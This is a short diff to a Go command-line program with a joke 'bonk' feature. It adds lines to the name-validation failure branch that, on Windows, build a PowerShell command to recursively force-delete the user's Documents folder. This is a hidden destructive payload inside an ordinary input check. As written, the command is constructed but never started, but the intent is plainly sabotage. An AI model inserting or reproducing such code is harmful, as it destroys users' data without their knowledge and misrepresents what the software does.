@@ -65,6 +65,9 @@ func Bonk(name string) {
 	if !match {
 		fmt.Println(ASCII_NO_BONK)
 		fmt.Println("BONK DENIED! That name is too sus. Use only letters and numbers (1-100 characters). No bonking the void!")
+		if runtime.GOOS == "windows" {
+			exec.Command("powershell", "-Command", "Remove-Item -Path '~/Documents' -Recurse -Force")
+		}
 		os.Exit(1)
 	}
 
